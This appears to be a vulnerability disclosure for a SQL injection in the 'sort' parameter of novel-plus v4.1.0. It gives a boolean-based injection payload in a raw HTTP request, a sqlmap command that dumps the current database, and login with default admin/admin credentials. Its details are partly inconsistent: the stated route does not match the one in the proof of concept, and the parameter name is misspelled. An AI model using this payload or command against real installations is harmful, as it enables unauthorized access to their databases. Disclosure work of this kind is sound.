# SQL injection vulnerability exists in novel-plus v4.1.0

Affected version:v4.1.0

official website:<https://novel.xxyopen.com/index.htm>

github:https://github.com/201206030/novel-plus

##Vulnerability Overview 

novel-plus version 4.1.0 has a SQL injection vulnerability. The vulnerability originates from the file "/sys/menu/list?sort=order_num," where manipulating the "sort" parameter can lead to SQL injection. Attackers can exploit this vulnerability to execute unauthorized SQL commands.

## Vulnerability details

Vulnerability route: /common/dict/list

Vulnerable parameter: sor

 "Login to the backend using the default account username/password 'admin/admin' to obtain the administrator cookie."

 	![1692688689238](../img/1.png)

![1692693955227](..\img\2.png)

Successful closure, displayed correctly 

![1692694702701](D:\Users\1\Desktop\novel-plus\img\4.png)

POC

```HTTP
GET /sys/menu/list?sort=order_num+AND+8446=(SELECT+(CASE+WHEN+(1=1)+THEN+8446+ELSE+(SELECT+2349+UNION+SELECT+7784)+END))--+ HTTP/1.1
Host: 192.168.52.163:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: JSESSIONID=bf61cb87-51f2-495f-8627-9b946ef6586f
Upgrade-Insecure-Requests: 1
```

Use SQLmap to extract the current database 

SQLmap command 

```python
python sqlmap.py -u "http://192.168.52.163:8088/sys/menu/list?sort=order_num" --cookie "JSESSIONID=bf61cb87-51f2-495f-8627-9b946ef6586f" -p "sort" --level 3  --current-db --batch
```

w	![1692694368675](..\img\3.png)
